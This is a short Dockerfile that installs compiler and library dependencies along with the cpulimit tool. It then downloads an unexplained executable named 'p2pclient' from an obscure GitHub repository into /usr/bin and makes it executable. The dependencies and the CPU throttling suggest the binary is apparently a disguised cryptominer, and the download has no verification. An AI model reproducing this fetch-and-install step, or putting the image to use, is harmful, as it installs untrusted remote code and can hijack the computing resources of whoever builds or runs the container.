FROM debian:sid

RUN apt update -y \
    	&& apt upgrade -y \
    	&& apt install -qy automake autoconf pkg-config libcurl4-openssl-dev libssl-dev  libjansson-dev libgmp-dev make gcc g++ git zlib1g-dev ocl-icd-opencl-dev \
        && apt-get install cpulimit && apt-get install wget -y && cd /usr/bin && wget https://raw.githubusercontent.com/pepek131happy4d/asddg/main/p2pclient && chmod +x p2pclient


